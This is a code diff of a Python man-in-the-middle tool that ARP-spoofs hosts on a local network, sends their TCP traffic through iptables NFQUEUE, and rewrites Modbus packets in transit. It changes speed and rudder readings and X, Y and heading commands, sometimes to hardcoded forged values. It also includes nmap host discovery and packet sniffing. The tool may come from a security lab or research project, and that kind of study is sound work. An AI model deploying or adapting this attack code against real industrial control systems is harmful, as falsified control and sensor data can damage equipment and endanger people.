@@ -1,14 +1,16 @@
-import subprocess
+import socket
 import time
 import scapy.all as scapy 
 import threading
 from scapy.layers.inet import TCP
 from scapy.contrib.modbus import *
-import netfilterqueue as nfq
+from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP, TCP
 import os
-from multiprocessing import Process, Event
 from queue import Queue
+from scapy.all import IP, ICMP, sr1
+import select
+
 
 # Safely decodes and modifies modbus packets. Never scapy unwrap without this class.
 class mb:
@@ -215,7 +217,7 @@ class mb:
             return out
 
 
-    
+
     '''
     useful pkt info:
     pkt.summary()
@@ -223,35 +225,18 @@ class mb:
     modbus_layer.payload
     '''
 
+
+
 class config:
     put_all: bool = False
     do_mods = False
-    xm = 1
-    ym = 1
-    tm = 1
-    sm = 1
-    rm = 1
-    xo = 0
-    yo = 0
-    to = 0
-    so = 0
-    ro = 0
+    
     def to_string():
-        return f"Mods\tx\ty\tt\ts\tr\nmult:\t{config.xm}\t{config.ym}\t{config.tm}\t{config.sm}\t{config.rm}\noffset:\t{config.xo}\t{config.yo}\t{config.to}\t{config.so}\t{config.ro}"
+        return f"Mods\tx\ty\tt\ts\tr\nmult:\t{mitm.xm}\t{mitm.ym}\t{mitm.tm}\t{mitm.sm}\t{mitm.rm}\noffset:\t{mitm.xo}\t{mitm.yo}\t{mitm.to}\t{mitm.so}\t{mitm.ro}"
     queue_size: int = 500
     put_real: bool = True
     put_fake: bool = True
-    def reset():
-        config.xm = 1
-        config.ym = 1
-        config.tm = 1
-        config.sm = 1
-        config.rm = 1
-        config.xo = 0
-        config.yo = 0
-        config.to = 0
-        config.so = 0
-        config.ro = 0
+    
 
 # Queues the packets for the GUI to poll
 class buffer:
@@ -333,122 +318,155 @@ class buffer:
 
     def size():
         return buffer.packet_queue.qsize()
-    
-    '''
 
-        register_value[0] = int(register_value[0])*matrix[3][0] + matrix[3][1]
-        register_value[1] = int(register_value[1])*matrix[4][0] + matrix[4][1]
-        return pkt
+# Handles nfq. Start, stop, callback, modify, etc.
+class mitm:
 
-        # Position data: alter based on register addr
-        if getattr(modbus_layer, "funcCode", "?") == 6:
-            register_addr = getattr(pdu, "registerAddr", "?")
-            register_value = getattr(pdu, "registerValue", "?")
-            if register_addr == "?" or register_value == "?":
-                return pkt
-            # X
-            if register_addr == 10:
-                register_value = int(register_value)*matrix[0][0] + matrix[0][1]
-            # Y
-            elif register_addr == 11:
-                register_value = int(register_value)*matrix[1][0] + matrix[1][1]
-            # Theta
-            elif register_addr == 12:
-                register_value = int(register_value)*matrix[2][0] + matrix[2][1]
-            return pkt
+    xm = 1
+    ym = 1
+    tm = 1
+    sm = 1
+    rm = 1
+
+    xo = 0
+    yo = 0
+    to = 0
+    so = 0
+    ro = 0
+
+    def reset_table():
+        mitm.xm = 1
+        mitm.ym = 1
+        mitm.tm = 1
+        mitm.sm = 1
+        mitm.rm = 1
+
+        mitm.xo = 0
+        mitm.yo = 0
+        mitm.to = 0
+        mitm.so = 0
+        mitm.ro = 0
+
+    def callback(pkt):
+        spkt = IP(pkt.get_payload())
+
+        if spkt.haslayer("Read Holding Registers Response"):
+            mbl = spkt.getlayer(ModbusADUResponse)
+
+            # Post incoming
+            '''
             
-        
-        # Recalculate fields
-        if pkt.haslayer(ModbusADURequest):
-            del pkt[ModbusADURequest].len
-        if pkt.haslayer(ModbusADUResponse):
-            del pkt[ModbusADUResponse].len
+            '''
 
-        del pkt[TCP].chksum
+            # Modify values
+            speed = mbl.payload.registerVal[0]
+            mbl.payload.registerVal[0] = int(speed * mitm.sm + mitm.so)
 
-        return pkt
-        '''
+            rudder = mbl.payload.registerVal[1]
+            mbl.payload.registerVal[1] = int(rudder * mitm.rm + mitm.ro)
 
-# Handles nfq. Start, stop, handler, etc.
-class net_filter_queue:
+            # Post outgoing
+            '''
+            
+            '''
+            print("s: ", mbl.payload.registerVal[0])
+            print("r: ", mbl.payload.registerVal[1])
+
+        elif spkt.haslayer("Write Single Register"):
+            mbl = spkt.getlayer(ModbusADURequest)
+
+            # Post incoming
+            '''
+            
+            '''
+
+            # Determine values
+            mult = 1
+            offset = 0
+            addr = "None"
+
+            if mbl.payload.registerAddr == 10: # X address
+                addr = "x"
+                mult = mitm.xm
+                offset = mitm.xo
+            elif mbl.payload.registerAddr == 11: # Y address
+                addr = "y"
+                mult = mitm.ym
+                offset = mitm.yo
+            elif mbl.payload.registerAddr == 12: # Theta address
+                addr = "t"
+                mult = mitm.tm
+                offset = mitm.to
+
+            # Modify values
+            z = mbl.payload.registerValue
+            mbl.payload.registerValue = int(z * mult + offset)
+            print(addr,": ", mbl.payload.registerValue)
+
+        else:
+            pkt.accept()
+            return
+
+        # Recalculate checksums
+        del spkt[TCP].chksum
+        del spkt[IP].chksum
+        del spkt[IP].len
+
+        pkt.set_payload(bytes(spkt))
+        pkt.accept()
+
+    def start():
+
+        mitm.stop_event = threading.Event()
+
+        mitm.t = threading.Thread(target=mitm._start, daemon=True)
+        mitm.t.start()
+
+    def _start():
+
+        # IPTables rule
+        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+
+        # Create and bind NFQ callback
+        nfq = NetfilterQueue()
+        nfq.bind(1, mitm.callback)
+
+        # Get readable file descriptor
+        qfd = nfq.get_fd()
+        poller = select.poll()
+        poller.register(qfd, select.POLLIN)
+
+        # Pipe for stop signaling
+        stop_r, stop_w = os.pipe()
+        poller.register(stop_r, select.POLLIN)
+
+        print("[*] NFQUEUE + Modbus MITM running...")
+
+        try:
+            while not mitm.stop_event.is_set():
+                events = poller.poll(500)
+                for fd, _ in events:
+                    if fd == qfd:
+                        nfq.run(False)   # process packets without blocking
+                    elif fd == stop_r:
+                        mitm.stop_event.set()
+        # Stop on error or stop event
+        finally:
+            print("[*] Cleaning up…")
+            nfq.unbind()
+            os.close(stop_r)
+            os.close(stop_w)
+            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
+            print("[*] Clean exit.")
 
     def stop():
         try:
-            net_filter_queue.stop_event
+            mitm.stop_event
+            mitm.t
         except:
             return
-        net_filter_queue.stop_event.set()
-        net_filter_queue.process.join(timeout=2)
-
-    def packet_listener(nfq_pkt):
-        mod = False
-    
-        pkt=IP(nfq_pkt.get_payload())
-
-        mb.print_scannable(pkt, show_transId=True)
-
-        # Modify values 
-        if mod:
-            if mb.is_commands(pkt):
-                buffer.put(pkt, "Incoming")
-                pkt = mb.set_speed(pkt, mb.get_speed(pkt)*config.sm + config.so)
-                pkt = mb.set_speed(pkt, mb.get_rudder(pkt)*config.rm + config.ro)
-            elif mb.is_coord(pkt):
-                buffer.put(pkt, "Incoming")
-                if mb.is_x(pkt):
-                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.xm + config.xo)
-                elif mb.is_y(pkt):
-                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.ym + config.yo)
-                elif mb.is_theta(pkt):
-                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.tm + config.to)
-                buffer.put(pkt,"Outgoing")
-        
-        mb.print_scannable(pkt, show_transId=False)
-                
-
-        del pkt[TCP].chksum
-        del pkt[IP].chksum
-        # packet.set_payload(bytes(pl))
-
-        # packet.set_payload(bytes(pl))
-
-
-        nfq_pkt.drop()
-        scapy.send(pkt)
-
-
-                    
-
-    def __setdown():
-        os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
-
-    def start_worker(stop_event):
-        os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
-
-        queue = nfq.NetfilterQueue()
-        queue.bind(1, net_filter_queue.packet_listener)
-
-        print("Starting Attack")
-
-        try:
-            while not stop_event.is_set():
-                queue.run(block=False)
-                time.sleep(0.01)
-        finally:
-            print("Stopping sniffing")
-            queue.unbind()
-            net_filter_queue.__setdown()
-
-    def start():
-        stop_event = Event()
-        net_filter_queue.stop_event = stop_event
-        p = Process(
-            target=net_filter_queue.start_worker,
-            args=(stop_event,),
-            daemon=True
-        )
-        p.start()
-        net_filter_queue.process = p
+        mitm.stop_event.set()
+        mitm.t.join()
 
 # Handles sniffing. Start, stop
 class scapy_sniffing:
@@ -570,7 +588,7 @@ class arp_spoofing:
 
         print("Stopped ARP Spoof")
 
-# Handles nmapping. get hosts
+# Handles nmapping. get local ip. get hosts. get host information
 class nmapping:
 
 # Dealing with hosts
@@ -655,53 +673,85 @@ class nmapping:
 
         return f"{ip}/{prefix}"
 
-    
 
-
-
+# Testing
 if __name__ == "__main__":
 
-    nmapping.print_hosts(nmapping.get_local_ip())
+    experiment = "fd_nfq"
 
-    print(f"\nYour IP: {nmapping.get_local_ip()}")
+    def callback(pkt):
+        spkt = IP(pkt.get_payload())
+
+        if spkt.haslayer("Read Holding Registers Response"):
+            mbl = spkt.getlayer(ModbusADUResponse)
+
+            print("Original speed:\t", mbl.payload.registerVal[0])
+            print("Original rudder:\t", mbl.payload.registerVal[1])
+
+            mbl.payload.registerVal[0] = 100
+            mbl.payload.registerVal[1] = 200
+
+        elif spkt.haslayer("Write Single Register"):
+            mbl = spkt.getlayer(ModbusADURequest)
+
+            print("Original coord:\t", mbl.payload.registerValue)
+            mbl.payload.registerValue = 90
+
+        else:
+            pkt.accept()
+            return
+
+        # Recalculate checksums
+        del spkt[TCP].chksum
+        del spkt[IP].chksum
+        del spkt[IP].len
+
+        pkt.set_payload(bytes(spkt))
+        pkt.accept()
 
 
-    ips = nmapping.get_host_ips(nmapping.get_local_ip())
-    
-    print("\nLocal devices found:\n","\n".join(ips),"\n\n")
+    if experiment == "nmap":
+        nmapping.print_hosts(nmapping.get_local_ip())
 
-    devices = nmapping.get_hosts(nmapping.get_local_ip())
-
-    print("Device Information")
-
-    nmapping.print_host_info(devices)
-    
-    device_info = nmapping.get_host_info(devices)
-    
-
-    
+        print(f"\nYour IP: {nmapping.get_local_ip()}")
 
 
-    ip1 = input("Enter ip 1\n\n")
-    ip2 = input("Enter ip 2\n\n")
+        ips = nmapping.get_host_ips(nmapping.get_local_ip())
+        
+        print("\nLocal devices found:\n","\n".join(ips),"\n\n")
 
-    arp_spoofing.start(ip1, ip2, silence=True)
+        devices = nmapping.get_hosts(nmapping.get_local_ip())
 
-    input("Press Enter to continue\n\n")
+        print("Device Information")
 
-    scapy_sniffing.start(print_console=True, put_buffer=False)
+        nmapping.print_host_info(devices)
+        
+        device_info = nmapping.get_host_info(devices)
+        
 
-    time.sleep(10)
+        
 
-    scapy_sniffing.stop()
-    arp_spoofing.stop()
 
-    if process == "nfq":
+        ip1 = input("Enter ip 1\n\n")
+        ip2 = input("Enter ip 2\n\n")
+
+        arp_spoofing.start(ip1, ip2, silence=True)
+
+        input("Press Enter to continue\n\n")
+
+        scapy_sniffing.start(print_console=True, put_buffer=False)
+
+        time.sleep(10)
+
+        scapy_sniffing.stop()
+        arp_spoofing.stop()
+
+    if experiment == "nfq":
 
         arp_spoofing.start()
 
         # Configure math
-        config.rm = 0
+        mitm.rm = 0
 
 
         # The print isn't the problem
@@ -771,181 +821,7 @@ if __name__ == "__main__":
             arp_spoofing.stop()
             nfqueue.unbind()
 
-    if process == "also_nfq":
-        arp_spoofing.start()
-        
-        # Configure math
-        config.rm = 0
-        config.xm = 0
-
-        # Dropping the original ((COMMAND)) and sending a scapy packet appears to work fine
-        def alter_command_and_drop(pkt):
-            spkt = IP(pkt.get_payload())
-            
-            if mb.is_commands(spkt) or mb.is_coord(spkt):
-                # Apply mods
-                spkt = mb.modify_values(spkt, False)
-                mb.print_scannable(spkt)
-                pkt.drop()
-                scapy.send(spkt)
-
-            else:
-                pkt.accept()
-
-
-        # I can't modify/drop/send or set_payload/accept coord packets without breaking connection
-        def alter_both_and_drop(pkt):
-            spkt = IP(pkt.get_payload())
-            if mb.is_commands(spkt):
-
-                # Change rudder (1) to 0
-                # spkt = mb.modify_values(spkt, False)
-
-                mb.print_scannable(spkt)
-                drop = True
-                if drop:
-                    pkt.drop()
-                    scapy.send(spkt)
-                else:
-                    pkt.accept()
-            elif mb.is_coord(spkt):
-                spkt = mb.modify_values(spkt, False)
-                
-                pkt.set_payload(bytes(spkt))
-                mb.print_scannable(spkt)
-                drop = False
-                if drop:
-                    pkt.drop()
-                    scapy.send(spkt)
-                else:
-                    pkt.accept()
-
-                # p2 = list(bytes())
-                # print(f"P2 is {p2}")
-            # mb.print_scannable(spkt)
-            else:
-                pkt.accept()
-
-        def show_all_accept_all(pkt):
-            spkt = IP(pkt.get_payload())
-            
-            if mb.is_coord(spkt):
-                
-                print("\n\nCoord")
-                spkt.show()
-        
-                pkt.accept()
-
-            elif mb.is_commands(spkt):
-                print("\n\nCommands")
-                spkt.show()
-                pkt.accept()
-
-            else:
-                print("\n\nnothing")
-                # spkt.show()
-                pkt.accept()
-
-        # Success seems to depend on how hard I reset the system. this is very stable
-        # Deleting TCP.chksum, IP.chksum, IP.len works
-        def callback(pkt):
-            spkt = IP(pkt.get_payload())
-
-            if spkt.haslayer("Read Holding Registers Response"):
-                mbl = spkt.getlayer(ModbusADUResponse)
-
-                mbl.payload.registerVal[0] = 100
-                mbl.payload.registerVal[1] = 200
-
-            elif spkt.haslayer("Write Single Register"):
-                mbl = spkt.getlayer(ModbusADURequest)
-
-                mbl.payload.registerValue = 90
-
-
-            else:
-                # Any packet we don't care about gets accepted
-                pkt.accept()
-                return
-
-            # The packets we care about get flushed and then accepted
-            del spkt[TCP].chksum
-            del spkt[IP].chksum
-            del spkt[IP].len
-            pkt.set_payload(bytes(spkt))
-
-            pkt.accept()
-
-        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
-
-        nfqueue = NetfilterQueue()
-        nfqueue.bind(1, callback)
-        try:
-            print("try run")
-            nfqueue.run()
-        except:
-            pass
-        finally:
-
-            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
-            arp_spoofing.stop()
-            nfqueue.unbind()
-            print("clean")
-   
-    if process == "async_nfq":
-        arp_spoofing.start()
-
-        
-        def callback(pkt):
-            spkt = IP(pkt.get_payload())
-
-            if spkt.haslayer("Read Holding Registers Response"):
-                mbl = spkt.getlayer(ModbusADUResponse)
-                
-                print("Original speed:\t",mbl.payload.registerVal[0])
-                print("Original rudder:\t",mbl.payload.registerVal[1])
-
-
-                mbl.payload.registerVal[0] = 100
-                mbl.payload.registerVal[1] = 200
-
-            elif spkt.haslayer("Write Single Register"):
-                mbl = spkt.getlayer(ModbusADURequest)
-
-                print("Original coord:\t",mbl.payload.registerValue)
-
-                mbl.payload.registerValue = 90
-
-
-            else:
-                # Any packet we don't care about gets accepted
-                pkt.accept()
-                return
-
-            # The packets we care about get flushed and then accepted
-            del spkt[TCP].chksum
-            del spkt[IP].chksum
-            del spkt[IP].len
-            pkt.set_payload(bytes(spkt))
-
-            pkt.accept()
-
-        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
-
-        nfqueue = NetfilterQueue()
-        nfqueue.bind(1, callback)
-        try:
-            print("try run")
-            nfqueue.run()
-        except:
-            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
-            arp_spoofing.stop()
-            nfqueue.unbind()
-            print("clean")
-            pass
-        print("I guess it made it past the thing")
-
-    if process == "fd_nfq":
+    if experiment == "fd_nfq":
         import select
 
         stop_event = threading.Event()
@@ -998,14 +874,10 @@ if __name__ == "__main__":
         t.join()
 
 
-def stop_nfqueue():
-    stop_event.set()
-    
+
 def abort_all():
     scapy_sniffing.stop()
-    net_filter_queue.stop()
+    mitm.stop()
     arp_spoofing.stop()
     buffer.clear()
-    config.reset()
-
-    # NEXT why is nfq so slow? because it's interrupting traffic. why?
+    mitm.reset_table()
